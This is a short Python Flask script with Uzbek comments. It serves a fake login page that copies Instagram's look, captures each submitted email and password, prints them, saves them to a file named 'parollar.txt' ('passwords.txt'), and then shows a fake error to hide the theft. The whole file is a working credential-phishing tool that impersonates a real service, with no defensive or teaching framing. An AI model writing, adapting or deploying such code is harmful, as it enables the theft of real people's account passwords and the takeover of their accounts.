from flask import Flask, request, render_template_string

app = Flask(__name__)

# HTML formasi (Instagram uslubida)
form_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: Arial, sans-serif; }
        .login-container {
            width: 350px; margin: 100px auto; padding: 40px;
            background-color: white; border: 1px solid #dbdbdb;
            text-align: center;
        }
        input[type=text], input[type=password] {
            width: 100%; padding: 10px; margin: 8px 0;
            background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px;
        }
        input[type=submit] {
            width: 100%; padding: 10px; background-color: #3897f0;
            border: none; color: white; font-weight: bold;
            border-radius: 5px; cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Instagram</h2>
        <form method='POST'>
            <input type='text' name='gmail' placeholder='Email yoki login' required><br>
            <input type='password' name='parol' placeholder='Parol' required><br>
            <input type='submit' value='Kirish'>
        </form>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        gmail = request.form['gmail']
        parol = request.form['parol']
        print(f"Yangi login: {gmail} - {parol}")
        with open('parollar.txt', 'a') as f:
            f.write(f"{gmail} - {parol}\n")
        return "Login parol xato yoki Internetinggizda muammo bor! error404"
    return render_template_string(form_html)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)